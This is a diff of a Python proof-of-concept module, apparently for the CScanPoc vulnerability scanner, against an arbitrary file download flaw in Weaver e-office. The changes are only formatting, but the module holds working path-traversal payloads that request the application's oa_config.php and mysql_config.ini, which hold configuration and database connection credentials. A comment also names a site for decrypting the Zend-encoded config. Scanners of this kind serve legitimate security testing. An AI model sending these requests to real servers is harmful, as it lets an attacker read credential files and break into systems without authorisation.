@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'weaver_0053' # 平台漏洞编号，留空
+    vuln_id = 'weaver_0053'  # 平台漏洞编号，留空
     name = '泛微e-office 任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2013-10-11'  # 漏洞公布时间
     desc = '''
         测试链接 [php]http://eoffice8.weaver.cn:8028/inc/attach.php?OP=1&ATTACHMENT_NAME=index.php&ATTACHMENT_ID=5402024843[/php]
@@ -33,10 +34,10 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #配置文件下载（程序zend加密，在网站http://www.showmycode.com/中可以解密）
+
+            # 配置文件下载（程序zend加密，在网站http://www.showmycode.com/中可以解密）
             payload1 = '/inc/attach.php?OP=1&ATTACHMENT_NAME=../../inc/oa_config.php&ATTACHMENT_ID=5402024843'
-            #数据库连接文件下载
+            # 数据库连接文件下载
             payload2 = '/inc/attach.php?OP=1&ATTACHMENT_NAME=../../mysql_config.ini&ATTACHMENT_ID=5402024843'
             url = self.target + payload1
             r = requests.get(url)
@@ -50,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
